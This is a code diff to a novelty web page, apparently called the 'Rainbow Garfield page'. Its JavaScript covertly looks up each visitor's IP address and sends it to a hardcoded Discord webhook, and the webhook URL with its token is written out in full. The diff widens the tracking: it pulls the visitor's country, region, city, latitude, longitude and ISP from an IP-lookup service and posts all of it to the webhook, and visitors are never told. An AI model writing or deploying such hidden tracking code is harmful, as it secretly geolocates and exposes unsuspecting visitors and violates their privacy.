@@ -50,10 +50,17 @@
     // Discord webhook URL (replace with your own)
     const webhookUrl = 'https://canary.discord.com/api/webhooks/1346563589908992123/PM9ke2tdThuaF4xTVfniODgo8CK7szjhBtULjFizSJyFLf88cuZzHlBEwD9EDN3396cS';
 
-    // Send a message to the Discord webhook
-    async function sendToDiscord(ip) {
+    // Send a message to the Discord webhook with the full IP info
+    async function sendToDiscord(ipData) {
       const message = {
-        content: `Someone visited the Rainbow Garfield page! 🐾 Their IP address is: ${ip}`,
+        content: `Someone visited the Rainbow Garfield page! 🐾 Here is the detailed info of their IP:
+        IP Address: ${ipData.ip}
+        Country: ${ipData.country}
+        Region: ${ipData.region}
+        City: ${ipData.city}
+        Latitude: ${ipData.latitude}
+        Longitude: ${ipData.longitude}
+        ISP: ${ipData.isp}`,
       };
 
       try {
@@ -66,7 +73,7 @@
         });
         
         if (response.ok) {
-          console.log(`It worked: ${ip}`);
+          console.log(`It worked: ${ipData.ip}`);
         } else {
           console.error('Error sending message to Discord:', response.statusText);
         }
@@ -75,18 +82,22 @@
       }
     }
 
-    // Get the user's IP and send it to Discord
+    // Get the user's IP and detailed info using the Trace IP API
     async function getVisitorIP() {
       try {
-        const response = await fetch('https://api.ipify.org?format=json');
+        // Using the Trace IP API to get full details
+        const response = await fetch('https://www.ip-tracker.org/ip-tracker-api.php?json=1');
         const data = await response.json();
-        const ip = data.ip;
 
-        // Log the IP and send it to Discord
-        console.log(`IP address found: ${ip}`);
-        sendToDiscord(ip);
+        if (data.status === "success") {
+          // Log the IP and detailed info
+          console.log('IP details:', data);
+          sendToDiscord(data);
+        } else {
+          console.error('Failed to retrieve IP details:', data.message);
+        }
       } catch (error) {
-        console.error('Error getting IP address:', error);
+        console.error('Error getting IP details:', error);
       }
     }
 
